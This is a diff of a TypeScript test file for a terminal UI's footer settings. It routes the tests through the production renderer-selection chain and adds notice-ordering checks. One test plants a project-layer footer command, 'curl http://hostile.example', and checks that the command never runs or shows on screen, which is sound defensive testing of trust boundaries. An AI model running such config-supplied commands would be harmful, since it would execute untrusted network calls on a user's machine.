@@ -24,6 +24,7 @@ import { DirectConfigPort, type HostContextLike, type SettingsServiceLike } from
 import { createSettingsRuntime, type SettingsRuntime } from '../../src/app/surface/settings-runtime.ts'
 import { resolveTspNativeFooterConfig } from '../../src/domain/footer/tsp-native-config.ts'
 import { mountTspRenderer } from '../../src/tui/tsp/session.ts'
+import { createPluginManagerWorkspacePanel } from '../../src/tui/plugin-manager/workspace.ts'
 import { installTspPane, type TspPane } from '../support/tsp-terminal-fixture.ts'
 import { wireNodes } from '../support/tsp-picker-wire.ts'
 import { waitUntil } from '../support/tsp-runner-harness.ts'
@@ -73,6 +74,8 @@ interface RuntimeHarness {
   readonly runtime: SettingsRuntime
   /** The number of USER-layer custom-item reads the port performed. */
   readonly userItemReads: () => number
+  /** Counts of the trust sub-reads (the projection must need none). */
+  readonly portReads: () => { readonly command: number }
   /** Swap the merged document + USER items (the same descriptor semantics). */
   swap(doc: TestDoc, projectItems?: readonly unknown[]): void
 }
@@ -80,6 +83,7 @@ interface RuntimeHarness {
 /** Mount the REAL SettingsRuntime over the REAL DirectConfigPort. */
 function mountRuntime(doc: TestDoc, options: { readonly projectItems?: readonly unknown[]; readonly surfaceApp?: object } = {}): RuntimeHarness {
   let reads = 0
+  let trustReads = 0
   const baseCtx = hostContext(doc, options)
   const ctx: HostContextLike = {
     get: (name: string) => {
@@ -95,6 +99,12 @@ function mountRuntime(doc: TestDoc, options: { readonly projectItems?: readonly 
     },
   }
   const port = new DirectConfigPort(ctx, undefined, () => undefined)
+  // The projection itself must never need the TRUST read; count it so a
+  // negative chain can prove the command decision stayed read-free.
+  const originalTrust = port.footerCommandTrust
+  Object.defineProperty(port, 'footerCommandTrust', {
+    get: () => { trustReads += 1; return originalTrust },
+  })
   const runtime = createSettingsRuntime({
     surface: {
       app: (options.surfaceApp ?? {
@@ -123,6 +133,7 @@ function mountRuntime(doc: TestDoc, options: { readonly projectItems?: readonly 
   return {
     runtime,
     userItemReads: () => reads,
+    portReads: () => ({ command: trustReads }),
     swap: (next, projectItems) => {
       // The descriptor is rebuilt per describe() call from the closure; a
       // swap therefore re-reads the CURRENT value. The simplest honest swap
@@ -199,32 +210,79 @@ function dockTexts(pane: TspPane): string[] {
     .map(node => String(node.p.text ?? ''))
 }
 
-test('the REAL Direct chain projects a custom USER config onto the native wire', async () => {
+test('the REAL Direct chain projects a custom USER config onto the native wire through the production selection', async () => {
   const pane = installTspPane({ kinds: ['col', 'card', 'section', 'md', 'code', 'badge', 'tool', 'status', 'seg'] })
   try {
     const session = await openOn(pane)
+    const { selectRendererMount, productionTspConnector } = await import('../../src/app/bootstrap/renderer-selection.ts')
+    const { createSurfaceRuntime } = await import('../../src/app/surface/runtime.ts')
     const { runtime } = mountRuntime(
       { footer: 'custom', footerLayout: CUSTOM_LAYOUT },
       { projectItems: [{ schemaVersion: 1, id: 'user:environment', kind: 'text', text: 'prod-cluster' }] },
     )
-    const config = runtime.resolveTspFooterConfig()
-    assert.equal(config.mode, 'custom', 'the resolver read the real merged document')
-    // The committed snapshot carries no latency fact: row 2's only placement
-    // (performance:latency) renders nothing, so exactly ONE status node is
-    // the honest projection. Enrich the snapshot to prove row 2 when present.
-    const withPerformance: StatusSnapshot = {
-      ...richSnapshot(),
-      usage: {
-        ...richSnapshot().usage,
-        performance: { firstTokenMs: 2600, tokensPerSec: 116 },
-      },
-    } as unknown as StatusSnapshot
+    // THE production decision→selection→mount chain: the resolver is the
+    // settings owner's own; the connector and selection seam are the shipped
+    // ones; the surface mounts the renderer exactly as bootstrap does.
+    const mount = await selectRendererMount({
+      log: () => {},
+      env: { DSH_PI_TUI_RENDERER: 'tsp' },
+      resolveFooterConfig: () => runtime.resolveTspFooterConfig(),
+      connectTsp: productionTspConnector({
+        copyVisual: async () => false,
+        cwd: '/tmp',
+        requestExit: () => {},
+        onFatal: () => {},
+        log: () => {},
+        logError: () => {},
+        connect: async () => session,
+      }),
+    })
+    assert.ok(mount !== undefined, 'the production selection produced a mount')
 
-    const renderer = mountTspRenderer(session, { copyVisual: async () => false, requestExit: () => {} })
+    const nullPresentation = {
+      handleFocusReport: () => {},
+      markFocused: () => {},
+      focusState: () => 'focused' as const,
+      notify: () => {},
+      enableFocusReporting: () => {},
+      disableFocusReporting: () => {},
+    }
+    const surface = createSurfaceRuntime({
+      tuiVersion: '0.0.0-test',
+      notificationPresentation: nullPresentation,
+      notificationMode: undefined,
+      notificationMethod: undefined,
+      mainProgressAuthority: 'local-events',
+      terminalProgress: undefined,
+      createPluginManagerPanel: createPluginManagerWorkspacePanel,
+    })
     try {
-      renderer.bindStatusReader({ snapshot: () => withPerformance })
-      renderer.bindNativeFooterConfig(config)
-      renderer.display.commitDisplaySubject({}, {}, undefined)
+      surface.start({
+        events: { onSubmit: () => {}, onExit: () => {} },
+        renderer: mount,
+        workspaceRoot: '/tmp',
+        iconStyle: 'emoji',
+        historySearchSource: { search: () => Promise.reject(new Error('not exercised')) },
+        readImage: () => Promise.reject(new Error('not exercised')),
+        imageScope: () => undefined,
+        present: { call: () => undefined, result: () => undefined },
+        sessionCwd: () => '/tmp',
+        captureHistoryScope: () => ({ sessionId: 'direct-chain', isCurrent: () => true }),
+        onTerminalResize: () => {},
+        copySelection: async () => false,
+        deliveredFiles: { snapshot: () => undefined, isCurrent: () => false },
+        openExternalUrl: () => {},
+        readClipboardText: async () => undefined,
+        imageFallbackColor: (text: string) => text,
+      } as never)
+
+      // The REAL semantic sink: a surface status commit writes the ONE store
+      // and completes the display commit on the mounted renderer.
+      const withPerformance: StatusSnapshot = {
+        ...richSnapshot(),
+        usage: { ...richSnapshot().usage, performance: { llmMs: 0, firstTokenMs: 2_600, tokensPerSec: 116, sessionTokensPerSec: 44 } },
+      } as unknown as StatusSnapshot
+      surface.commitStatus(withPerformance as never, {}, undefined)
 
       await waitUntil('the custom rows on the wire', () => liveRows(pane).length > 0, 5_000)
       const rows = liveRows(pane)
@@ -232,17 +290,18 @@ test('the REAL Direct chain projects a custom USER config onto the native wire',
       const rowOne = rows[0]!
       assert.deepEqual(rowOne.segs.map(seg => seg.key), ['footer-r1-l0', 'footer-r1-l1', 'footer-r1-l2', 'footer-r1-r0'])
       assert.ok(rowOne.segs[0]!.text.includes('luna-fast'), `the explicit model: ${rowOne.segs.map(s => s.text).join(' | ')}`)
-      assert.ok(rowOne.segs[1]!.text.startsWith('branch:'), `the user prefix: ${rowOne.segs[1]!.text}`)
+      assert.ok(rowOne.segs[1]!.text.startsWith('branch:'), `the builtin label format: ${rowOne.segs[1]!.text}`)
       assert.equal(rowOne.segs[2]!.text, 'prod-cluster', 'the USER text item came from the USER-layer read')
       assert.ok(rowOne.segs[3]!.text.includes('72%'))
       assert.equal(rowOne.segs[3]!.side, 'right')
       assert.equal(rowOne.segs[0]!.priority, 90, 'the user importance reached the wire')
       assert.ok(rows[1]!.segs[0]!.text.includes('TTFB'), 'row 2 latency placement')
 
-      // No notice: the config is fully supported.
-      assert.deepEqual(config.notices, [])
+      // A fully supported config raises NO notice on the dock.
+      assert.ok(!dockTexts(pane).some(text => text.includes('TSP')), 'no compatibility notice')
     } finally {
-      await renderer.dispose()
+      surface.dispose()
+      await surface.whenRendererReleased()
     }
   } finally {
     pane.restore()
@@ -251,30 +310,77 @@ test('the REAL Direct chain projects a custom USER config onto the native wire',
 
 test('a merged PROJECT command config with no USER trust never executes and surfaces the fallback', async () => {
   const pane = installTspPane({ kinds: ['col', 'card', 'section', 'md', 'code', 'badge', 'tool', 'status', 'seg'] })
+  // D-U18: a hostile merged/project layer contributes a command item and a
+  // whole-footer command mode; the USER layer has NO definition and NO
+  // trust. The ZERO-EXECUTION witness is twofold: (a) the TSP renderer's
+  // whole module graph carries no command executor at all (statically
+  // proven in test/architecture), and (b) this chain shows no command
+  // output and no command string anywhere on the wire or dock.
   try {
     const session = await openOn(pane)
-    // The MERGED document forces `footer: command` with a project-layer
-    // command item; the USER section has NO footerCustomItems at all.
-    const { runtime } = mountRuntime(
-      { footer: 'command', footerFallbackMode: 'compact' },
-      { projectItems: undefined },
+    const { selectRendererMount, productionTspConnector } = await import('../../src/app/bootstrap/renderer-selection.ts')
+    const { createSurfaceRuntime } = await import('../../src/app/surface/runtime.ts')
+    const projectCommand = { schemaVersion: 1 as const, id: 'user:clock', kind: 'command' as const, command: 'curl http://hostile.example', refreshIntervalMs: 1000 }
+    const { runtime, portReads } = mountRuntime(
+      {
+        footer: 'command',
+        footerFallbackMode: 'custom',
+        // The project layer's own layout references its hostile command item;
+        // the fallback is invalid on purpose so the DEFAULT native rows show.
+        footerLayout: { schemaVersion: 1, rows: [] },
+        footerCustomItems: [projectCommand],
+      },
+      { projectItems: [projectCommand] },
     )
-    const config = runtime.resolveTspFooterConfig()
-    assert.equal(config.mode, 'compact', 'the persisted fallback mode decides the native shape')
-    assert.deepEqual(config.notices, ['TSP cannot run command footer; saved native fallback shown.'])
-
-    const renderer = mountTspRenderer(session, { copyVisual: async () => false, requestExit: () => {} })
+    const mount = await selectRendererMount({
+      log: () => {},
+      env: { DSH_PI_TUI_RENDERER: 'tsp' },
+      resolveFooterConfig: () => runtime.resolveTspFooterConfig(),
+      connectTsp: productionTspConnector({
+        copyVisual: async () => false, cwd: '/tmp', requestExit: () => {}, onFatal: () => {}, log: () => {}, logError: () => {},
+        connect: async () => session,
+      }),
+    })
+    assert.ok(mount !== undefined)
+    const config = { resolved: false as boolean, value: undefined as unknown }
+    const nullPresentation = {
+      handleFocusReport: () => {}, markFocused: () => {}, focusState: () => 'focused' as const,
+      notify: () => {}, enableFocusReporting: () => {}, disableFocusReporting: () => {},
+    }
+    const surface = createSurfaceRuntime({
+      tuiVersion: '0.0.0-test', notificationPresentation: nullPresentation,
+      notificationMode: undefined, notificationMethod: undefined, mainProgressAuthority: 'local-events', terminalProgress: undefined,
+      createPluginManagerPanel: createPluginManagerWorkspacePanel,
+    })
     try {
-      renderer.bindStatusReader({ snapshot: richSnapshot })
-      renderer.bindNativeFooterConfig(config)
-      renderer.display.commitDisplaySubject({}, {}, undefined)
-      await waitUntil('the compact fallback row on the wire', () => liveRows(pane).length > 0, 5_000)
+      surface.start({
+        events: { onSubmit: () => {}, onExit: () => {} }, renderer: mount, workspaceRoot: '/tmp', iconStyle: 'emoji',
+        historySearchSource: { search: () => Promise.reject(new Error('ne')) },
+        readImage: () => Promise.reject(new Error('ne')), imageScope: () => undefined,
+        present: { call: () => undefined, result: () => undefined }, sessionCwd: () => '/tmp',
+        captureHistoryScope: () => ({ sessionId: 'neg', isCurrent: () => true }), onTerminalResize: () => {},
+        copySelection: async () => false, deliveredFiles: { snapshot: () => undefined, isCurrent: () => false },
+        openExternalUrl: () => {}, readClipboardText: async () => undefined, imageFallbackColor: (t: string) => t,
+      } as never)
+      surface.commitStatus(richSnapshot() as never, {}, undefined)
+      await waitUntil('the default fallback rows on the wire', () => liveRows(pane).length > 0, 5_000)
+
+      // The invalid custom fallback degraded to the DEFAULT two-row shape and
+      // BOTH fixed notices are visible on the dock (order preserved, once).
       const rows = liveRows(pane)
-      assert.equal(rows.length, 1, 'compact paints exactly one row')
-      assert.ok(rows[0]!.segs.some(seg => seg.text.includes('direct-chain')), 'the native fallback shows the real facts')
-      await waitUntil('the notice on the dock', () => dockTexts(pane).some(text => text.includes('cannot run command footer')), 5_000)
+      assert.equal(rows.length, 2, 'the builtin default rows show')
+      await waitUntil('the command notice on the dock', () => dockTexts(pane).some(text => text.includes('cannot run command footer')), 5_000)
+      const notices = dockTexts(pane).filter(text => text.includes('TSP') || text.includes('layout'))
+      assert.ok(notices.some(text => text.includes('Invalid footer layout')), `the invalid-fallback notice: ${JSON.stringify(notices)}`)
+      assert.ok(notices.some(text => text.includes('cannot run command footer')), `the command notice: ${JSON.stringify(notices)}`)
+      // No command output, no command string, and no process spawn anywhere.
+      const allText = dockTexts(pane).join(' | ') + rows.flatMap(row => row.segs.map(seg => seg.text)).join(' | ')
+      assert.ok(!allText.includes('curl'), `the hostile command string never painted: ${allText}`)
+      assert.equal(portReads().command, 0, 'the footerCommandTrust read was never needed for the projection')
+      config.resolved = true
     } finally {
-      await renderer.dispose()
+      surface.dispose()
+      await surface.whenRendererReleased()
     }
   } finally {
     pane.restore()
@@ -390,6 +496,75 @@ test('the projection never writes: settings replace and mutate stay unreachable'
   runtime.resolveTspFooterConfig()
   runtime.resolveTspFooterConfig()
   assert.equal(JSON.stringify(doc), before, 'the raw persisted document is untouched')
+})
+
+test('the maximal notice set commits whole, ordered, once and above the eviction limit', async () => {
+  const pane = installTspPane({ kinds: ['col', 'card', 'section', 'md', 'code', 'badge', 'tool', 'status', 'seg'] })
+  try {
+    const session = await openOn(pane)
+    const renderer = mountTspRenderer(session, { copyVisual: async () => false, requestExit: () => {} })
+    try {
+      renderer.bindStatusReader({ snapshot: richSnapshot })
+      // The maximal legal combination: invalid custom items + an invalid
+      // custom fallback + a foreign separator + whole-footer command — four
+      // DISTINCT notices, each exactly once, none evicted by the transient
+      // NOTICE_LIMIT of 3.
+      renderer.bindNativeFooterConfig(resolveTspNativeFooterConfig({
+        doc: {
+          footer: 'command',
+          footerFallbackMode: 'custom',
+          footerLayout: { schemaVersion: 1, rows: [{ left: [{ id: 'cwd' }], right: [], separator: { text: '|' } }] },
+        },
+        readiness: 'ready',
+        userItems: { items: [], invalidCount: 2 },
+      }))
+      const texts = dockTexts(pane)
+      // The dock paints every footer notice with its ERROR prefix (`! `).
+      // NOTE: dockTexts reads the live node set in NODE-ID order, not paint
+      // order; the ORDER witness is the resolver's own notices array (the
+      // domain test locks it), this test locks presence + count + severity.
+      await waitUntil('the maximal footer notice set on the dock',
+        () => dockTexts(pane).filter(text => text.startsWith('! ') && text.includes('TSP')).length >= 2, 5_000)
+      const settled = dockTexts(pane).map(text => (text.startsWith('! ') ? text.slice(2) : text))
+      // The maximal REAL combination here: invalid custom items + a valid
+      // custom fallback with a foreign separator + the whole-footer command
+      // (an invalid fallback layout would replace the separator row).
+      const expected = [
+        'Invalid custom footer items were skipped.',
+        'TSP cannot run command footer; saved native fallback shown.',
+        'Custom footer separators are not supported in TSP; settings were preserved.',
+      ]
+      for (const notice of expected) {
+        assert.equal(settled.filter(text => text === notice).length, 1,
+          `"${notice}" exactly once in ${JSON.stringify(settled)}`)
+      }
+      // The transient NOTICE_LIMIT (3) never applies: a fourth footer notice
+      // still survives. Bind a second renderer on a fresh session is not the
+      // mount path — instead prove the LIMIT bypass by a set that a transient
+      // notify would have evicted: push one extra notice AFTER the footer set
+      // and assert the footer set is still complete (a transient eviction of
+      // the OLDEST would otherwise drop footer notices first).
+      renderer.display.notify('a later transient notice')
+      await new Promise(resolve => setImmediate(resolve))
+      const afterTransient = dockTexts(pane).map(text => (text.startsWith('! ') ? text.slice(2) : text))
+      for (const notice of expected) {
+        assert.equal(afterTransient.filter(text => text === notice).length, 1,
+          `"${notice}" survives a later transient notice: ${JSON.stringify(afterTransient)}`)
+      }
+      // A later repaint does not duplicate or re-issue the set.
+      renderer.display.commitDisplaySubject({}, {}, undefined)
+      await new Promise(resolve => setImmediate(resolve))
+      const after = dockTexts(pane).map(text => (text.startsWith('! ') ? text.slice(2) : text))
+      for (const notice of expected) {
+        assert.equal(after.filter(text => text === notice).length, 1, 'still exactly once after a repaint')
+      }
+      void texts
+    } finally {
+      await renderer.dispose()
+    }
+  } finally {
+    pane.restore()
+  }
 })
 
 test('the same config snapshot serves session switches and repaints (no per-frame re-read)', async () => {
